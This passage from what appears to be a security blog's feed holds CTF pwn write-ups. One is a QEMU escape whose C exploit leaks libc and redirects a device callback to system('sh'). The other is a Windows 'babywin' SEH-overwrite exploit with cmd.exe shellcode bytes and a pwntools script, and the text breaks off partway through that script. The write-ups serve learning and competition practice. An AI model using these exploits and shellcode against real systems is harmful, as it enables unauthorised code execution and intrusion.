&amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">  result = (<span class="type">void</span> *)(v6 &gt;&gt; <span class="number">3</span>);</span><br><span class="line">  v10 = v6 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( n[<span class="number">0</span>] &lt;= <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">void</span> *)(<span class="number">8</span> * v10 + n[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = v6;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">char</span> *)v9 + (<span class="type">unsigned</span> <span class="type">int</span>)v6 + <span class="number">3124</span>, &amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>果然发现了后门,越界写也已经找到了,那接下来就是泄露libc,然后劫持执行流,跟上一题差不多就不多说了</p><p><strong>exp</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* mmio;</span><br><span class="line"><span class="type">uint32_t</span> port_base = <span class="number">0xc000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> port, <span class="type">uint32_t</span> val)</span> &#123;</span><br><span class="line">        outl(val, port_base + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> port)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint32_t</span>)inl(port_base + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">        *(<span class="type">uint64_t</span>*)(mmio + addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">uint64_t</span>*)(mmio + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (iopl(<span class="number">3</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;I/O permission is not enough\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mmio_fd =</span><br><span class="line">        open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    mmio = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">uint64_t</span> u64cmd;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>* cmd = <span class="string">&quot;sh&quot;</span>;</span><br><span class="line">        <span class="built_in">strcpy</span>(&amp;u64cmd, cmd); </span><br><span class="line"></span><br><span class="line">        mmio_write(<span class="number">0</span>, <span class="number">666</span>);</span><br><span class="line">        <span class="type">uint32_t</span> num = pmio_read(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        mmio_write(<span class="number">0x80</span>, <span class="number">0x100</span>);</span><br><span class="line">        <span class="type">uint64_t</span> libc_base = mmio_read(<span class="number">0x14</span>) - <span class="number">0x1e780</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;libc_base:\t0x%llx\n&quot;</span>, libc_base);</span><br><span class="line">        <span class="keyword">if</span> (libc_base == <span class="number">0</span> || (libc_base &amp; <span class="number">0xFFF</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">uint64_t</span> system_addr = libc_base + <span class="number">0x28d70</span>;</span><br><span class="line">        pmio_write(<span class="number">0x14</span>, system_addr &amp; <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">        pmio_write(<span class="number">0x18</span>, system_addr &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">        mmio_write(<span class="number">0x40</span>, u64cmd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">qemu-escape</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="qemu-escape" scheme="https://ixout.github.io/tags/qemu-escape/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑babywin复现</title>
    <link href="https://ixout.github.io/posts/57890/"/>
    <id>https://ixout.github.io/posts/57890/</id>
    <published>2024-04-15T15:18:04.000Z</published>
    <updated>2024-04-21T07:37:25.095Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>题目给的附件有三个文件,一个exe,两个dll</p><p>先对exe进行checksec</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-16_161739.png" alt=""></p><p>比较重要的几个</p><ul><li>没有栈不可执行</li><li>存在(GS)canary</li><li>没有地址随机化</li></ul><p>ida打开exe分析,程序是32位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">sub_401060</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *v2; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line">  <span class="type">char</span> *Buffer; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = (<span class="type">const</span> <span class="type">void</span> *)gift();</span><br><span class="line">  Buffer = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>u);</span><br><span class="line">  output(<span class="string">&quot;your gift: %p\n&quot;</span>, v2);</span><br><span class="line">  output(<span class="string">&quot;give your data:&quot;</span>);</span><br><span class="line">  v0 = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  fgets(Buffer, <span class="number">200</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> overflow(Buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">overflow</span><span class="params">(<span class="type">char</span> *Source)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Destination[<span class="number">32</span>]; <span class="comment">// [esp+0h] [ebp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(Destination, Source);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcat</span>(Destination, Source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以明显地发现一个溢出漏洞,如果在linux平台下这就是最简单的栈溢出了</p><p>但在windows环境下,不太熟悉</p><h1 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">your gift: 00000009</span><br><span class="line">give your data:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure><p><code>your gift</code>没啥用,只是加载了<code>gift.dll</code>模块</p><p>data我们先尝试随便输点东西</p><p>结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(a7c<span class="number">.3314</span>): Access violation - code <span class="title function_">c0000005</span> <span class="params">(first chance)</span></span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=<span class="number">0000000</span>a ebx=<span class="number">002f</span>5000 ecx=<span class="number">61616161</span> edx=<span class="number">7</span>efeff09 esi=<span class="number">005646</span>c8 edi=<span class="number">0019f</span>f5d</span><br><span class="line">eip=<span class="number">762</span>ec8b1 esp=<span class="number">0019f</span>ed8 ebp=<span class="number">0019f</span>f0c iopl=<span class="number">0</span>         nv up ei pl nz na po nc</span><br><span class="line">cs=<span class="number">0023</span>  ss=<span class="number">002b</span>  ds=<span class="number">002b</span>  es=<span class="number">002b</span>  fs=<span class="number">0053</span>  gs=<span class="number">002b</span>             efl=<span class="number">00010202</span></span><br><span class="line">ucrtbase!<span class="built_in">strcat</span>+<span class="number">0x71</span>:</span><br><span class="line"><span class="number">762</span>ec8b1 <span class="number">8</span>a11            mov     dl,byte ptr [ecx]          ds:<span class="number">002b</span>:<span class="number">61616161</span>=??</span><br></pre></td></tr></table></figure><p>在strcat函数内出错了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">overflow</span><span class="params">(<span class="type">char</span> *Source)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Destination[<span class="number">32</span>]; <span class="comment">// [esp+0h] [ebp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(Destination, Source);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcat</span>(Destination, Source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这其中存在栈溢出,一开始还想不太通为啥会出错,然后突然意识到这是32位的程序,参数通过栈传递的,那么溢出就已经把栈中保存的参数给覆盖了</p><hr><p>看到程序没有开启NX又没有后门的情况下</p><p>第一时间想到的是ret2shellcode,但有两个问题:</p><ol><li>没有这样的gadget可供使用</li><li>canary的存在</li></ol><p>这都是在已有的条件下无法解决的问题</p><p>此时就需要利用windows下的SEH机制了,<strong>SEH链是保存在栈中的</strong>,发生异常时,会遍历SEH中的处理函数直到找到可以处理的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; !teb</span><br><span class="line">TEB at <span class="number">002f</span>8000</span><br><span class="line">    ExceptionList:        <span class="number">0019f</span>f60</span><br><span class="line">    StackBase:            <span class="number">001</span>a0000</span><br><span class="line">    StackLimit:           <span class="number">0019</span>d000</span><br><span class="line">    SubSystemTib:         <span class="number">00000000</span></span><br><span class="line">    FiberData:            <span class="number">00001e00</span></span><br><span class="line">    ArbitraryUserPointer: <span class="number">00000000</span></span><br><span class="line">    Self:                 <span class="number">002f</span>8000</span><br><span class="line">    EnvironmentPointer:   <span class="number">00000000</span></span><br><span class="line">    ClientId:             <span class="number">00000</span>a7c . <span class="number">00003314</span></span><br><span class="line">    RpcHandle:            <span class="number">00000000</span></span><br><span class="line">    Tls Storage:          <span class="number">00564</span>d30</span><br><span class="line">    PEB Address:          <span class="number">002f</span>5000</span><br><span class="line">    LastErrorValue:       <span class="number">0</span></span><br><span class="line">    LastStatusValue:      <span class="number">0</span></span><br><span class="line">    Count Owned Locks:    <span class="number">0</span></span><br><span class="line">    HardErrorMode:        <span class="number">0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; dps <span class="number">0019f</span>f60 l2</span><br><span class="line"><span class="number">0019f</span>f60  <span class="number">0019f</span>fcc</span><br><span class="line"><span class="number">0019f</span>f64  <span class="number">00401b</span>28 babywin+<span class="number">0x1b28</span></span><br></pre></td></tr></table></figure><p>如果我们溢出到该处那么就可以劫持异常处理流</p><p>我们下一个断点看看正常处理下会是怎样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</span><br><span class="line">(<span class="number">27f</span>8<span class="number">.323</span>c): Access violation - code <span class="title function_">c0000005</span> <span class="params">(first chance)</span></span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=<span class="number">0019000</span>a ebx=<span class="number">002</span>d5000 ecx=<span class="number">61616161</span> edx=<span class="number">7f</span>17ff09 esi=<span class="number">005746e8</span> edi=<span class="number">0019f</span>f71</span><br><span class="line">eip=<span class="number">762</span>ec8b1 esp=<span class="number">0019f</span>ed8 ebp=<span class="number">0019f</span>f0c iopl=<span class="number">0</span>         nv up ei pl nz na po nc</span><br><span class="line">cs=<span class="number">0023</span>  ss=<span class="number">002b</span>  ds=<span class="number">002b</span>  es=<span class="number">002b</span>  fs=<span class="number">0053</span>  gs=<span class="number">002b</span>             efl=<span class="number">00010202</span></span><br><span class="line">ucrtbase!<span class="built_in">strcat</span>+<span class="number">0x71</span>:</span><br><span class="line"><span class="number">762</span>ec8b1 <span class="number">8</span>a11            mov     dl,byte ptr [ecx]          ds:<span class="number">002b</span>:<span class="number">61616161</span>=??</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dd esp l10</span><br><span class="line"><span class="number">0019f</span>ed8  <span class="number">0057b</span>8d0 <span class="number">0040110</span>d <span class="number">0019f</span>ee8 <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>ee8  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>ef8  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f08  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; d <span class="number">0019f</span>ee8 l20</span><br><span class="line"><span class="number">0019f</span>ee8  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>ef8  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f08  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f18  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f28  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f38  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f48  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f58  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br></pre></td></tr></table></figure><p>异常触发时,此时还是strcat函数的栈</p><p><code>0019fee8</code>是<code>dst</code>,<code>61616161</code>是<code>src</code>,显然后者不可访问,发生错误</p><p>继续跟进异常处理,如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line">eax=<span class="number">00000000</span> ebx=<span class="number">00000000</span> ecx=<span class="number">00401b</span>28 edx=<span class="number">77808</span>ad0 esi=<span class="number">00000000</span> edi=<span class="number">00000000</span></span><br><span class="line">eip=<span class="number">00401b</span>28 esp=<span class="number">0019f</span>918 ebp=<span class="number">0019f</span>938 iopl=<span class="number">0</span>         nv up ei pl zr na pe nc</span><br><span class="line">cs=<span class="number">0023</span>  ss=<span class="number">002b</span>  ds=<span class="number">002b</span>  es=<span class="number">002b</span>  fs=<span class="number">0053</span>  gs=<span class="number">002b</span>             efl=<span class="number">00000246</span></span><br><span class="line">babywin+<span class="number">0x1b28</span>:</span><br><span class="line"><span class="number">00401b</span>28 <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dd esp l20</span><br><span class="line"><span class="number">0019f</span>918  <span class="number">77808</span>ab2 <span class="number">0019f</span>a18 <span class="number">0019f</span>f60 <span class="number">0019f</span>a68</span><br><span class="line"><span class="number">0019f</span>928  <span class="number">0019f</span>9a4 <span class="number">0019f</span>f60 <span class="number">77808</span>ad0 <span class="number">0019f</span>f60</span><br><span class="line"><span class="number">0019f</span>938  <span class="number">0019f</span>a00 <span class="number">77808</span>a84 <span class="number">0019f</span>a18 <span class="number">0019f</span>f60</span><br><span class="line"><span class="number">0019f</span>948  <span class="number">0019f</span>a68 <span class="number">0019f</span>9a4 <span class="number">00401b</span>28 <span class="number">0019f</span>f60</span><br><span class="line"><span class="number">0019f</span>958  <span class="number">0019f</span>a18 <span class="number">00000000</span> <span class="number">777e92</span>ef <span class="number">0019f</span>a18</span><br><span class="line"><span class="number">0019f</span>968  <span class="number">0019f</span>f60 <span class="number">0019f</span>a68 <span class="number">0019f</span>9a4 <span class="number">00401b</span>28</span><br><span class="line"><span class="number">0019f</span>978  <span class="number">0019f</span>f35 <span class="number">00734588</span> <span class="number">0019f</span>a18 <span class="number">00000000</span></span><br><span class="line"><span class="number">0019f</span>988  <span class="number">0019f</span>a68 <span class="number">0019f</span>f60 <span class="number">00000032</span> <span class="number">0019</span>d000</span><br></pre></td></tr></table></figure><p>当执行到此处时,栈上会是这样一个状态,我们着重关注<code>esp+8</code>,发现其正好<strong>是当前的<code>ExceptionList</code></strong>(此时eip就由其handler决定),<u>而且这是一个距离可控栈比较近的地址</u></p><p>所以如果劫持这个handler为<code>pop ?;pop?;ret</code>那么就可以回到栈上执行shellcode</p><p>然后<code>0019ff60</code>处再写个jmp跳开handler指针,执行shellcode</p><p>不过这里还有一个问题,babywin开启了safeseh,所以我们需要找一个<u>没有开启该保护的模块</u>去找需要的gadget</p><p>发现<code>gift.dll</code>就刚好满足这个条件</p><p>而且能够找到不少gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x271f16ac pop ecx; pop ebp; ret</span><br><span class="line">0x271f1794 pop esi; pop ebp; ret</span><br><span class="line">0x271f19c9 pop esi; pop ebx; ret</span><br><span class="line">0x271f19f5 pop esi; pop ebx; ret</span><br><span class="line">0x271f1a84 pop esi; pop ebp; ret</span><br></pre></td></tr></table></figure><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>我们只需要在检查gs之前,触发错误处理</p><p>就能够控制执行任意shellcode</p><p>先确认一下偏移,由之前的数据可以得知</p><p><code>offset=0x19ff60-0x19fee8=120</code></p><p>偏移确定,现在需要解决如何编写shellcode,不像linux平台下我们可以直接使用syscall来做一些系统级的调用方便getshell或者row</p><p>windows的shellcode编写更为复杂一点</p><p>不过好在我们可以直接借用某些工具,例如<a href="https://github.com/NytroRST/ShellcodeCompiler/tree/master">NytroRST/ShellcodeCompiler: Shellcode Compiler (github.com)</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">WinExec</span><span class="params">(<span class="string">&quot;kernel32.dll&quot;</span>)</span>;</span><br><span class="line">function <span class="title function_">ExitProcess</span><span class="params">(<span class="string">&quot;kernel32.dll&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line">WinExec(<span class="string">&quot;cmd.exe&quot;</span>,<span class="number">0</span>);</span><br><span class="line">ExitProcess(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>使用<code>.\ShellcodeCompiler_x86.exe -r .\source.txt -o shellcode.bin -a shellcode.asm -p win_x86</code>导出结果</p><p>还要注意需要二次读取足够的shellcode</p><p><strong>exp:(不懂为什么只有windbg调试的情况下,才能成功)</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">pop2 = <span class="number">0x271f16ac</span> <span class="comment">#: pop ecx ; pop ebp ; ret</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;192.168.137.1&quot;</span>,<span class="number">12978</span>)</span><br><span class="line"></span><br><span class="line">shell = <span class="string">b&#x27;1\xc9d\x8bA0\x8b@\x0c\x8bp\x14\xad\x96\xad\x8bX\x10\x8bS&lt;\x01\xda\x8bRx\x01\xda\x8br \x01\xde1\xc9A\xad\x01\xd8\x818GetPu\xf4\x81x\x04rocAu\xeb\x81x\x08ddreu\xe2\x8br$\x01\xdef\x8b\x0cNI\x8br\x1c\x01\xde\x8b\x14\x8e\x01\xda1\xc9SRQharyAhLibrhLoadTS\xff\xd2\x83\xc4\x0cYP1\xc0\xb8xec#P\x83l$\x03#hWinET\xfft$\x14\xffT$\x14\x83\xc4\x08P1\xc0\xb8ess#P\x83l$\x03#hProchExitT\xfft$\x1c\xffT$\x1c\x83\xc4\x0cP1\xc0\xb8exe#P\x83l$\x03#hcmd.T1\xc0P\xfft$\x04\xffT$\x18\x83\xc4\x0c1\xc0P\xffT$\x04&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="string">b&#x27;\n&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> shell)</span><br><span class="line"></span><br><span class="line"><span class="comment"># eip = p32(0x62616167)</span></span><br><span class="line"><span class="comment"># payload = b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&#x27;</span></span><br><span class="line"><span class="comment"># offset = cyclic_find(payload,eip)</span></span><br><span class="line"><span class="comment"># success(&#x27;offset : &#x27; + hex(offset))</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov ecx,0x01010101</span></span><br><span class="line"><span class="string">    mov eax,0x14121bd           /*__acrt_iob_func*/</span></span><br><span class="line"><span class="string">    xor eax,ecx </span></span><br><span class="line"><span class="string">    mov ebx,[eax]</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    push ecx</span></span><br><span class="line"><span class="string">    call ebx</span></span><br><span class="line"><span class="string">    pop ecx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push eax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov ecx,0x01010101          /*fgets*/</span></span><br><span class="line"><span class="string">    push ecx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    push eax</span></span><br><span class="line"><span class="string">emmm:</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    test eax,eax</span></span><br><span class="line"><span class="string">    